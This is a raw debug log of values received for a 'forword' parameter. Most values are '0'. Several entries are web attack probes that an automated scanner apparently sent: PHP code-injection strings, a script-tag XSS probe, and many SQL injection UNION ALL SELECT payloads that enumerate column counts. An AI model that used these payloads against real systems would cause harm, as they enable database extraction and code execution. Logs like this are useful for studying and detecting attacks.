[2015-10-17 22:38:33][debug] forword：0
[2015-10-17 22:38:33][debug] forword：0
[2015-10-17 22:38:34][debug] forword：0
[2015-10-17 22:38:34][debug] forword：0
[2015-10-17 22:38:35][debug] forword：0
[2015-10-17 22:38:35][debug] forword：0
[2015-10-17 22:38:36][debug] forword：0
[2015-10-17 22:38:36][debug] forword：0
[2015-10-17 22:38:36][debug] forword：0
[2015-10-17 22:38:37][debug] forword：0
[2015-10-17 22:38:37][debug] forword：0
[2015-10-17 22:38:38][debug] forword：0
[2015-10-17 22:38:38][debug] forword：
[2015-10-17 22:38:38][debug] forword：0
[2015-10-17 22:38:39][debug] forword：0
[2015-10-17 22:38:39][debug] forword：0
[2015-10-17 22:38:40][debug] forword：0
[2015-10-17 22:38:40][debug] forword：0
[2015-10-17 22:38:41][debug] forword：0
[2015-10-17 22:38:41][debug] forword：0
[2015-10-17 22:38:42][debug] forword：0
[2015-10-17 22:38:42][debug] forword：0
[2015-10-17 22:38:43][debug] forword：0
[2015-10-17 22:38:43][debug] forword：0
[2015-10-17 22:38:44][debug] forword：0
[2015-10-17 22:38:44][debug] forword：0
[2015-10-17 22:38:45][debug] forword：0
[2015-10-17 22:38:45][debug] forword：0
[2015-10-17 22:38:46][debug] forword：0
[2015-10-17 22:38:46][debug] forword：0
[2015-10-17 22:38:47][debug] forword：0
[2015-10-17 22:38:47][debug] forword：0
[2015-10-17 22:38:48][debug] forword：0
[2015-10-17 22:38:48][debug] forword：0
[2015-10-17 22:38:49][debug] forword：0
[2015-10-17 22:38:49][debug] forword：0
[2015-10-17 22:38:50][debug] forword：0
[2015-10-17 22:38:50][debug] forword：0
[2015-10-17 22:38:51][debug] forword：0
[2015-10-17 22:38:51][debug] forword：${@print(md5(this_is_a_test_string))}
[2015-10-17 22:38:51][debug] forword：0
[2015-10-17 22:38:52][debug] forword：0
[2015-10-17 22:38:52][debug] forword：0
[2015-10-17 22:38:52][debug] forword：0
[2015-10-17 22:38:53][debug] forword：0
[2015-10-17 22:38:53][debug] forword：${@print(md5(this_is_a_test_string))}\
[2015-10-17 22:38:53][debug] forword：0
[2015-10-17 22:38:54][debug] forword：0
[2015-10-17 22:38:54][debug] forword：0
[2015-10-17 22:38:54][debug] forword：0
[2015-10-17 22:38:55][debug] forword：0
[2015-10-17 22:38:55][debug] forword：print(md5(this_is_a_test_string));die();/*
[2015-10-17 22:38:55][debug] forword：0
[2015-10-17 22:38:56][debug] forword：0
[2015-10-17 22:38:56][debug] forword：0
[2015-10-17 22:38:56][debug] forword：0
[2015-10-17 22:38:57][debug] forword：0
[2015-10-17 22:38:57][debug] forword：0
[2015-10-17 22:38:57][debug] forword：0
[2015-10-17 22:38:58][debug] forword：'"><scRipt>alert(98733)</sCript>
[2015-10-17 22:38:58][debug] forword：0
[2015-10-17 22:38:58][debug] forword：0
[2015-10-17 22:38:59][debug] forword：0
[2015-10-17 22:38:59][debug] forword：0
[2015-10-17 22:39:00][debug] forword：0
[2015-10-17 22:39:00][debug] forword：0
[2015-10-17 22:39:01][debug] forword：0
[2015-10-17 22:39:01][debug] forword：0
[2015-10-17 22:39:01][debug] forword：0
[2015-10-17 22:39:02][debug] forword：0
[2015-10-17 22:39:02][debug] forword：0
[2015-10-17 22:39:03][debug] forword：0
[2015-10-17 22:39:03][debug] forword：0
[2015-10-17 22:39:04][debug] forword：0
[2015-10-17 22:39:04][debug] forword：0
[2015-10-17 22:39:05][debug] forword：0
[2015-10-17 22:39:05][debug] forword：0
[2015-10-17 22:39:06][debug] forword：0
[2015-10-17 22:39:06][debug] forword：0
[2015-10-17 22:39:07][debug] forword：0
[2015-10-17 22:39:07][debug] forword：0
[2015-10-17 22:39:08][debug] forword：0
[2015-10-17 22:39:08][debug] forword：0
[2015-10-17 22:39:09][debug] forword：0
[2015-10-17 22:39:09][debug] forword：0
[2015-10-17 22:39:10][debug] forword：0
[2015-10-17 22:39:10][debug] forword：0
[2015-10-17 22:39:11][debug] forword：0
[2015-10-17 22:39:11][debug] forword：0
[2015-10-17 22:39:12][debug] forword：0
[2015-10-17 22:39:12][debug] forword：0
[2015-10-17 22:39:13][debug] forword：0
[2015-10-17 22:39:13][debug] forword：0
[2015-10-17 22:39:14][debug] forword：0
[2015-10-17 22:39:14][debug] forword：0
[2015-10-17 22:39:15][debug] forword：0
[2015-10-17 22:39:15][debug] forword：0
[2015-10-17 22:39:16][debug] forword：0
[2015-10-17 22:39:16][debug] forword：0
[2015-10-17 22:39:17][debug] forword：0
[2015-10-17 23:07:42][debug] forword：0
[2015-10-17 23:07:43][debug] forword：0
[2015-10-17 23:07:43][debug] forword：0
[2015-10-17 23:07:43][debug] forword：0)..,.',.[[
[2015-10-17 23:07:44][debug] forword：0
[2015-10-17 23:07:44][debug] forword：0' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:07:45][debug] forword：0') UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:07:45][debug] forword：0' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[2015-10-17 23:07:46][debug] forword：0' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:07:46][debug] forword：0') UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:07:46][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:07:47][debug] forword：0' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[2015-10-17 23:07:47][debug] forword：0' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[2015-10-17 23:07:48][debug] forword：0' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:07:48][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:07:49][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:07:49][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:07:50][debug] forword：0' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[2015-10-17 23:07:50][debug] forword：0' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[2015-10-17 23:07:51][debug] forword：0' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[2015-10-17 23:07:51][debug] forword：0' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:07:52][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:07:52][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:07:53][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:07:53][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:07:54][debug] forword：0' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[2015-10-17 23:07:54][debug] forword：0' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[2015-10-17 23:07:54][debug] forword：0' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[2015-10-17 23:07:55][debug] forword：0' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[2015-10-17 23:07:55][debug] forword：0' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:07:56][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:07:56][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:07:57][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:07:57][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:07:58][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:07:58][debug] forword：0' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL#
[2015-10-17 23:07:59][debug] forword：0' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[2015-10-17 23:07:59][debug] forword：0' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[2015-10-17 23:08:00][debug] forword：0
[2015-10-17 23:08:00][debug] forword：0' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[2015-10-17 23:08:00][debug] forword：0' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[2015-10-17 23:08:01][debug] forword：0' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:01][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:02][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:02][debug] forword：0
[2015-10-17 23:08:02][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:02][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:03][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:03][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:04][debug] forword：0' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL#
[2015-10-17 23:08:04][debug] forword：0' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL#
[2015-10-17 23:08:05][debug] forword：0' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[2015-10-17 23:08:05][debug] forword：0' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[2015-10-17 23:08:06][debug] forword：0' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[2015-10-17 23:08:06][debug] forword：0' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[2015-10-17 23:08:07][debug] forword：0' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:07][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:08][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:08][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:09][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:09][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:10][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:10][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:10][debug] forword：0' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[2015-10-17 23:08:11][debug] forword：0' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL#
[2015-10-17 23:08:11][debug] forword：0' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL#
[2015-10-17 23:08:12][debug] forword：0' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[2015-10-17 23:08:12][debug] forword：0' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[2015-10-17 23:08:13][debug] forword：0' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[2015-10-17 23:08:13][debug] forword：0' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[2015-10-17 23:08:14][debug] forword：0' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:14][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:15][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:15][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:16][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:16][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:17][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:17][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:18][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:18][debug] forword：0' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[2015-10-17 23:08:18][debug] forword：0' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[2015-10-17 23:08:19][debug] forword：0' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL#
[2015-10-17 23:08:19][debug] forword：0' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL#
[2015-10-17 23:08:20][debug] forword：0' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[2015-10-17 23:08:20][debug] forword：0' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[2015-10-17 23:08:21][debug] forword：0' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[2015-10-17 23:08:21][debug] forword：0' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[2015-10-17 23:08:22][debug] forword：0' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:22][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:23][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:23][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:24][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:24][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:25][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:25][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:26][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:26][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:27][debug] forword：0' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[2015-10-17 23:08:27][debug] forword：0' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[2015-10-17 23:08:27][debug] forword：0' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[2015-10-17 23:08:28][debug] forword：0' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL#
[2015-10-17 23:08:28][debug] forword：0' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL#
[2015-10-17 23:08:29][debug] forword：0' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[2015-10-17 23:08:29][debug] forword：0' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[2015-10-17 23:08:30][debug] forword：0' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[2015-10-17 23:08:30][debug] forword：0' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[2015-10-17 23:08:31][debug] forword：0' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:31][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:32][debug] forword：
[2015-10-17 23:08:32][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:32][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:33][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:33][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:34][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:34][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:35][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:35][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:36][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:36][debug] forword：0 UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:37][debug] forword：0) UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:37][debug] forword：0 UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[2015-10-17 23:08:37][debug] forword：0 UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:38][debug] forword：0) UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:38][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:39][debug] forword：0 UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[2015-10-17 23:08:39][debug] forword：0 UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[2015-10-17 23:08:40][debug] forword：0
[2015-10-17 23:08:40][debug] forword：0 UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:40][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:41][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:41][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:42][debug] forword：0 UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[2015-10-17 23:08:42][debug] forword：0 UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[2015-10-17 23:08:43][debug] forword：0 UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[2015-10-17 23:08:43][debug] forword：0 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:44][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 23:08:44][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
